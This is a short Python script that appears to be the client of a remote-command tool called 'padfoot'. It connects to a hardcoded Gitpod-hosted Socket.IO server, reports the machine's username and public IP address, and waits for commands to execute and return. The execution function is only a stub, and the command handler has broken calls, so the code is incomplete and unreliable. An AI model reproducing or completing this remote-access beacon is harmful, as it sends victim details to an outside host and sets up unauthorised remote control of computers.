import socketio
import public_ip as ip
import json
import getpass

SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
# Connect to the Socket.IO server
sio = socketio.Client()

def execute_command(command):
  output = 0
  return output

@sio.on('connect')
def on_connect():
  print('Connected to server')
  data = {'client': True, 'username': getpass.getuser(), 'ip': ip.get()} 
  sio.emit('establishment', data)
  

@sio.on('disconnect')
def on_disconnect():
    print('Disconnected from server')

@sio.on('command')
def command(data):
  metadata = json.loads(data)
  output = execute_command(data.command)
  return_data = {'output': output, 'sender': data.returnAddress}
  sio.emit()

# Start the connection
sio.connect(SERVER)

# Wait for the connection to establish
sio.wait()
